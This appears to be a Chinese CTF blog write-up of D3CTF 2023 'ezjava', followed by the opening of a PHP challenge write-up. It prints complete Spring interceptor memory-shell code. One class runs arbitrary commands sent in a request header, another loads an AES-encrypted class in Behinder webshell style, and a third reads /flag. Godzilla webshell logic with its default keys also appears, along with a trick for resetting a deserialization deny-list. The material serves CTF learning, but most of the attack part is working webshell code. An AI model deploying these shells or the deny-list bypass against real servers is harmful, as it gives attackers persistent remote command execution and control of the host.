class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-keyword">import</span> java.io.OutputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringInterceptorBehinderForEzJava</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">counter</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringInterceptorBehinderForEzJava</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">// 获取 WebApplicationContext</span>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> WebApplicationContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest().getServletContext());        <span class="hljs-comment">// 获取 RequestMappingHandlerMapping</span>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-comment">// 注册 Interceptor</span>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);        field.setAccessible(<span class="hljs-literal">true</span>);        List&lt;HandlerInterceptor&gt; adaptedInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(requestMappingHandlerMapping);        adaptedInterceptors.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringInterceptorBehinderForEzJava</span>(<span class="hljs-number">1</span>));        <span class="hljs-comment">// 匹配特定路径的 Interceptor</span><span class="hljs-comment">//        MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]&#123;&quot;/demo&quot;&#125;, null, new SpringInterceptor(1));</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringInterceptorBehinderForEzJava</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();        <span class="hljs-type">HashMap</span> <span class="hljs-variable">pageContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();        pageContext.put(<span class="hljs-string">&quot;request&quot;</span>,request);        pageContext.put(<span class="hljs-string">&quot;response&quot;</span>,response);        pageContext.put(<span class="hljs-string">&quot;session&quot;</span>,session);        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;/blacklist/jdk/get&quot;</span>.equals(request.getRequestURI())) &#123;            response.setContentType(<span class="hljs-string">&quot;application/json&quot;</span>);            System.out.println(<span class="hljs-string">&quot;requesting blacklist&quot;</span>);            <span class="hljs-keyword">if</span> (counter % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) &#123;                System.out.println(<span class="hljs-string">&quot;sending denyclasses&quot;</span>);                List&lt;String&gt; denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();                denyClasses.add(<span class="hljs-string">&quot;fake.test&quot;</span>);                <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();                <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);                objectOutputStream.writeObject(denyClasses);                <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());                objectOutputStream.close();                baos.close();                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;code\&quot;: \&quot;200\&quot;, \&quot;message\&quot;: \&quot;&quot;</span> + msg + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>;                <span class="hljs-type">OutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> response.getOutputStream();                output.write(result.getBytes());                output.flush();            &#125; <span class="hljs-keyword">else</span> &#123;                System.out.println(<span class="hljs-string">&quot;sending serialized payload&quot;</span>);                <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;code\&quot;: \&quot;200\&quot;, \&quot;message\&quot;: \&quot;&quot;</span> + payload + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>;                <span class="hljs-type">OutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> response.getOutputStream();                output.write(result.getBytes());                output.flush();            &#125;            counter ++;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;true&quot;</span>.equals(request.getHeader(<span class="hljs-string">&quot;Behinder&quot;</span>))) &#123;            <span class="hljs-keyword">try</span> &#123;                <span class="hljs-type">String</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;                session.putValue(<span class="hljs-string">&quot;u&quot;</span>, k);                <span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);                c.init(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));                <span class="hljs-type">byte</span>[] data = c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);                m.setAccessible(<span class="hljs-literal">true</span>);                <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> (Class) m.invoke(Thread.currentThread().getContextClassLoader(),data, <span class="hljs-number">0</span>, data.length);                clazz.newInstance().equals(pageContext);            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                e.printStackTrace();            &#125;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;    &#125;&#125;</code></pre></div><p>首先是Interceptor内存马的实现逻辑，这个我不是很熟，不说了</p><p>然后匹配路径，当是&#x2F;blacklist&#x2F;jdk&#x2F;get时，我们开始控制响应数据</p><p>counter用来标识请求次数，因为要先重置黑名单再打反序列化，所以要标识</p><p>重置黑名单的实现代码很简单</p><div class="code-wrapper"><pre><code class="hljs">           List&lt;String&gt; denyClasses = new ArrayList&lt;&gt;();            denyClasses.add(&quot;fake.test&quot;);            ByteArrayOutputStream baos = new ByteArrayOutputStream();            ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);            objectOutputStream.writeObject(denyClasses);            String msg = Base64.getEncoder().encodeToString(baos.toByteArray());</code></pre></div><p>建一个List然后添加个不存在的包名，然后序列化和base64加密即可</p><p>另一部分就是打fastjson原生反序列化的加载恶意内存马的base64数据</p><p>这里就给出恶意内存马</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Hessian;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<span class="hljs-keyword">import</span> org.springframework.web.context.support.WebApplicationContextUtils;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.io.OutputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringInterceptorEcho</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringInterceptorEcho</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">// 获取 WebApplicationContext</span>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> WebApplicationContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest().getServletContext());        <span class="hljs-comment">// 获取 RequestMappingHandlerMapping</span>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-comment">// 注册 Interceptor</span>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);        field.setAccessible(<span class="hljs-literal">true</span>);        List&lt;HandlerInterceptor&gt; adaptedInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(requestMappingHandlerMapping);        adaptedInterceptors.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringInterceptorEcho</span>(<span class="hljs-number">1</span>));        <span class="hljs-comment">// 匹配特定路径的 Interceptor</span><span class="hljs-comment">//        MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]&#123;&quot;/demo&quot;&#125;, null, new SpringInterceptor(1));</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringInterceptorEcho</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;Cmd&quot;</span>);        response.setStatus(<span class="hljs-number">200</span>);        response.setHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/html&quot;</span>);        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> response.getOutputStream();            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);            <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> process.getInputStream();            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();            <span class="hljs-type">int</span> n;            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];            <span class="hljs-keyword">while</span> ((n = input.read(buffer)) != -<span class="hljs-number">1</span>) &#123;                baos.write(buffer);            &#125;            baos.write(<span class="hljs-string">&quot;\n&quot;</span>.getBytes());            input.close();            output.write(baos.toByteArray());            output.flush();        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;&#125;</code></pre></div><p>就是一个普通的Interceptor内存马</p><p>当然要是不想拿shell，想直接访问路由的，就可以直接把命令写死就行，直接<code>cat /flag</code>(毕竟是复现)</p><div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span>    Memshell2 extends AbstractTranslet implements HandlerInterceptor &#123;    public static <span class="hljs-built_in">int</span> nums = <span class="hljs-number">1</span>;    static &#123;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;staart&quot;</span>);        WebApplicationContext context = (WebApplicationContext) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextHolder</span>.</span></span>current<span class="hljs-constructor">RequestAttributes()</span>.get<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, 0)</span>;        RequestMappingHandlerMapping mappingHandlerMapping = context.get<span class="hljs-constructor">Bean(RequestMappingHandlerMapping.<span class="hljs-params">class</span>)</span>;        Field field = null;        <span class="hljs-keyword">try</span> &#123;            field = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractHandlerMapping</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>)</span>;        &#125; catch (NoSuchFieldException e) &#123;            e.print<span class="hljs-constructor">StackTrace()</span>;        &#125;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        List&lt;HandlerInterceptor&gt; adaptInterceptors = null;        <span class="hljs-keyword">try</span> &#123;            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);        &#125; catch (IllegalAccessException e) &#123;            e.print<span class="hljs-constructor">StackTrace()</span>;        &#125;        Memshell2 evilInterceptor = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Memshell2()</span>;        adaptInterceptors.add(evilInterceptor);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;ok&quot;</span>);    &#125;    public static String replace<span class="hljs-constructor">Blank(String <span class="hljs-params">str</span>)</span> &#123;        String dest = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">if</span> (str != null) &#123;            Pattern p = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Pattern</span>.</span></span>compile(<span class="hljs-string">&quot;\\s*|\t|\r|\n&quot;</span>);            Matcher m = p.matcher(str);            dest = m.replace<span class="hljs-constructor">All(<span class="hljs-string">&quot;&quot;</span>)</span>;        &#125;        return dest;    &#125;    @Override    public boolean pre<span class="hljs-constructor">Handle(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>, Object <span class="hljs-params">handler</span>)</span> throws Exception &#123;        String code;<span class="hljs-comment">//       if(nums == 1)&#123;</span><span class="hljs-comment">//           Runtime.getRuntime().exec(&quot;grep -rn --exclude-dir=&#123;proc,sys&#125; flag&#123;* / &gt; /tmp/1.txt&quot;);</span><span class="hljs-comment">//       &#125;</span>        InputStream <span class="hljs-keyword">in</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;cat /flag&quot;</span>).get<span class="hljs-constructor">InputStream()</span>;        Scanner s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Scanner(<span class="hljs-params">in</span>)</span>.use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\A&quot;</span>)</span>;        String output = s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(output);        code = <span class="hljs-string">&quot;&#123;\&quot;code\&quot;:\&quot;200\&quot;,\&quot;message\&quot;:\&quot;&quot;</span>+ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">output</span>.<span class="hljs-params">getBytes</span>()</span>)+<span class="hljs-string">&quot;\&quot;&#125;&quot;</span>;        <span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">RequestURI()</span>.equals(<span class="hljs-string">&quot;/status&quot;</span>)) &#123;            String result = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Scanner(<span class="hljs-params">code</span>)</span>.use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\A&quot;</span>)</span>.next<span class="hljs-literal">()</span>;            response.add<span class="hljs-constructor">Header(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>)</span>;            response.get<span class="hljs-constructor">Writer()</span>.write(result);            response.get<span class="hljs-constructor">Writer()</span>.flush<span class="hljs-literal">()</span>;            response.get<span class="hljs-constructor">Writer()</span>.close<span class="hljs-literal">()</span>;            nums++;            return <span class="hljs-literal">false</span>;        &#125;        return <span class="hljs-literal">true</span>;    &#125;    @Override    public void post<span class="hljs-constructor">Handle(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>, Object <span class="hljs-params">handler</span>, ModelAndView <span class="hljs-params">modelAndView</span>)</span> throws Exception &#123;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HandlerInterceptor</span>.</span></span>super.post<span class="hljs-constructor">Handle(<span class="hljs-params">request</span>, <span class="hljs-params">response</span>, <span class="hljs-params">handler</span>, <span class="hljs-params">modelAndView</span>)</span>;    &#125;    @Override    public void after<span class="hljs-constructor">Completion(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>, Object <span class="hljs-params">handler</span>, Exception <span class="hljs-params">ex</span>)</span> throws Exception &#123;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HandlerInterceptor</span>.</span></span>super.after<span class="hljs-constructor">Completion(<span class="hljs-params">request</span>, <span class="hljs-params">response</span>, <span class="hljs-params">handler</span>, <span class="hljs-params">ex</span>)</span>;    &#125;    @Override    public void transform(DOM document, SerializationHandler<span class="hljs-literal">[]</span> handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;</code></pre></div><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="/../images/D-3CTF2023-ezjava/image-20240415180252625.png" alt="image-20240415180252625"></p><p><img src="/../images/D-3CTF2023-ezjava/image-20240415180225947.png" alt="image-20240415180225947"></p><p>通过访问server的status让他访问register的&#x2F;blacklist&#x2F;jdk&#x2F;get从而触发内存马逻辑返回控制的响应</p><p>不过两个curl之间要间隔10s，毕竟他要过10s才更新</p><p><img src="/../images/D-3CTF2023-ezjava/image-20240415180529171.png" alt="image-20240415180529171"></p><p><img src="/../images/D-3CTF2023-ezjava/image-20240415180602824.png" alt="image-20240415180602824"></p><p>直接访问路由的</p><p><img src="/../images/D-3CTF2023-ezjava/image-20240415180737560.png" alt="image-20240415180737560"></p><h2 id="冰蝎和哥斯拉逻辑"><a href="#冰蝎和哥斯拉逻辑" class="headerlink" title="冰蝎和哥斯拉逻辑"></a>冰蝎和哥斯拉逻辑</h2><p>当时看的时候还不懂什么意思，后来看了下其他文章</p><p>原理分析不会，就说一下特征吧</p><h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>关键代码</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<span class="hljs-type">HashMap</span> <span class="hljs-variable">pageContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();pageContext.put(<span class="hljs-string">&quot;request&quot;</span>,request);pageContext.put(<span class="hljs-string">&quot;response&quot;</span>,response);pageContext.put(<span class="hljs-string">&quot;session&quot;</span>,session);<span class="hljs-keyword">try</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;   <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span>session.putValue(<span class="hljs-string">&quot;u&quot;</span>, k);<span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-type">byte</span>[] data = c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);m.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> (Class) m.invoke(Thread.currentThread().getContextClassLoader(),data, <span class="hljs-number">0</span>, data.length);clazz.newInstance().equals(pageContext);&#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;e.printStackTrace();&#125;</code></pre></div><p><img src="/../images/D-3CTF2023-ezjava/image-20240415181944397.png" alt="image-20240415181944397"></p><p>冰蝎可以通过创建hashmap放入request、response、session替换pagecontext来解决</p><p>然后后一部分就是AES解密然后加载</p><p>当然这只是关键代码，网上有很多应对不同版本的解决方法</p><h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>哥斯拉不像冰蝎中传入pagecontext能够通过session拿到parameters，那么如果我们抛弃session，直接把parameters通过equals函数传给payload类呢？</p><div class="code-wrapper"><pre><code class="hljs java">    <span class="hljs-type">String</span> <span class="hljs-variable">xc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;3c6e0b8a9c15224a&quot;</span>;   <span class="hljs-comment">//定义AES加解密的Key，默认为key</span>    <span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;pass&quot;</span>;    <span class="hljs-type">String</span> <span class="hljs-variable">md5</span> <span class="hljs-operator">=</span> md5(pass + xc);    Class payload;。。。。。一些加密解密的函数，像base64，AES，MD5,反射ClassLoader的defineClass等        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">byte</span>[] data = base64Decode(req.getParameter(pass));            data = x(data, <span class="hljs-literal">false</span>);            <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>) &#123;                payload = defClass(data);            &#125; <span class="hljs-keyword">else</span> &#123;                java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arrOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();                <span class="hljs-type">Object</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> payload.newInstance();                f.equals(arrOut);                f.equals(data);                f.equals(req);                resp.getWriter().write(md5.substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>));                f.toString();                resp.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)));                resp.getWriter().write(md5.substring(<span class="hljs-number">16</span>));            &#125;        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;        &#125;</code></pre></div><p>实现的关键是三个<code>f.equals()</code>，前两个是必要的，后一个是非必要的</p><h2 id="冰蝎的使用"><a href="#冰蝎的使用" class="headerlink" title="冰蝎的使用"></a>冰蝎的使用</h2><p>注意加请求头就行，发起的请求是POST</p><p><img src="/../images/D-3CTF2023-ezjava/image-20240415193651480.png" alt="image-20240415193651480"></p><p><img src="/../images/D-3CTF2023-ezjava/image-20240415193918234.png" alt="image-20240415193918234"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>本来想测试一下哥斯拉逻辑的，但是我不知道为什么不行，哥斯拉连不上，找原因什么的根本不会，算了</p><p>还是学习一下jdk高版本绕过方法吧</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://exp10it.io/2023/05/hessian-cve-2021-43297-d3ctf-2023-ezjava/#d3ctf-2023-ezjava">Hessian CVE-2021-43297 &amp; D3CTF 2023 ezjava - X1r0z Blog (exp10it.io)</a></p><p>[D3CTF x AntCTF 2023 Web 赛后复现 - Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/05/06/D3CTF">https://boogipop.com/2023/05/06/D3CTF</a> x AntCTF 2023 Web 赛后复现&#x2F;)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>红明谷2024--web复现</title>
    <link href="/2024/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="2024红明谷–web复现"><a href="#2024红明谷–web复现" class="headerlink" title="2024红明谷–web复现"></a>2024红明谷–web复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>忘记报名了，就随便看看复现一下</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">// flag.php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>])) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);&#125;</code></pre></div><p>搜索找到文章<a href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle">https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</a></p><p>利用题目中的工具读取文件</p><p>。。。。服了，还真不会用，那些参数都不知道加什么</p><p>最后看WP加上<code>--time_based_attack True --match &quot;Allowed memory size&quot;</code>就可以了</p><div 